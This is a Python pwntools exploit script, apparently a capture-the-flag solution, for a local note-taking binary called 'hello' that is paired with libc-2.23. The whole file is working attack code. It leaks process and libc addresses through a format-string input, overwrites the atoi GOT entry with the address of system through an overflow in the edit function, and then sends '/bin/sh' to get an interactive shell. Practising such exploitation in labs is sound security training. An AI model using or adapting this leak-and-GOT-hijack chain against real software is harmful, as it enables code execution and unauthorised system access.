from pwn import *

p = process('../file/hello')
hello = ELF('../file/hello')
libc = ELF('../file/libc-2.23.so')

context.log_level = 'DEBUG'

input('continue?')

def newNote(number, name, size, des):
    p.recvuntil(b'your choice>>')
    p.sendline(b'1')
    p.recvuntil(b'phone number:')
    p.sendline(number.encode())
    p.recvuntil(b'name:')
    p.sendline(name.encode())
    p.recvuntil(b'size:')
    p.sendline(size.encode())
    p.recvuntil(b'des info:')
    p.sendline(des.encode())

def showNote(index):
    p.recvuntil(b'your choice>>')
    p.sendline(b'3')
    p.recvuntil(b'index:')
    p.sendline(index.encode())

def editNote(index, number, name, des):
    p.recvuntil(b'your choice>>')
    p.sendline(b'4')
    p.recvuntil(b'index:')
    p.sendline(index)
    p.recvuntil(b'number:')
    p.sendline(number)
    p.recvuntil(b'name:')
    p.sendline(name)
    p.recvuntil(b'des info:')
    p.sendline(des)

# leak
newNote('%12$p%13$p', '0', '128', '0'*16)
showNote('0')
process_and_libc = p.recvuntil(b'name', drop=True)[-29:-1]
process_base = int(process_and_libc[:14].decode(), 16) - 0x12a0
libc_base = int(process_and_libc[14:].decode(), 16) - (libc.symbols['__libc_start_main'] + 231)
print(hex(process_base))
print(hex(libc_base))

# get atoi_got
atoi_got = hello.got['atoi'] + process_base
system_addr = libc.symbols['system'] + libc_base

# modify atoi_got -> system_addr
overwrite_payload = b'a' * 13 + p64(atoi_got)
editNote(b'0', b'0', overwrite_payload, p64(system_addr))

# get shell
p.recvuntil(b'your choice>>')
p.sendline(b'/bin/sh')

p.interactive()